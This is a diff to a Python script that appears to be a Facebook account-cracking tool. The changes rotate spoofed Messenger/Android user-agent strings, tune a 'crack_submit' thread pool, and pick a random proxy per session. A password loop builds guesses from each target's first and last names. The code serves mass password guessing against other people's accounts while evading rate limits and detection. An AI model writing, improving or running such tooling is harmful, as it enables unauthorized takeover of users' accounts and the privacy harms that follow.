@@ -531,8 +531,8 @@ else:
 #------------[ THIS IS FOR METHOD 1 ]--------------#  
 #------------[ THIS IS FOR RANDOM 1 ]--------------#  	     	     
 def ONE():
-    END = 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]","Mozilla/5.0 (Linux; Android 9; SM-A600FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;] "," Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;] '
-    ua = 'Mozilla/5.0 (Linux; Android 12; 22011119UY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]","Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;] '+END
+    END = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1","Dalvik/2.1.0 (Linux; U; Android 10; SM-N975U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;] FBBK/1","Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1 '
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]","Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]","Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1 '+END
     return ua   
     ua1 = 'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1423};FB_FW/1;] FBBK/1","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;] FBBK/1","Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;] '+END
     return ua     
@@ -1212,7 +1212,7 @@ def menu():
                                # else:
                                         #pcp.append('n')
                                       
-                                with tred(max_workers=50) as crack_submit:
+                                with tred(max_workers=35) as crack_submit:
                                         clear()
                                         #linex()
                                         total_ids = str(len(fo))
@@ -1436,9 +1436,11 @@ def api1(ids,names,passlist):
                 except:
                         ln = fn
                         proxies=proxies_list
-                        for proxy in proxies:
-                               session = requests.Session()
-                               session.proxies = {'http': proxy, 'https': proxy}
+                        proxy1 = random.choice(proxies)
+                        session = requests.Session()
+                        session.proxies = {'http': proxy1, 'https': proxy1}
+
+
             
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
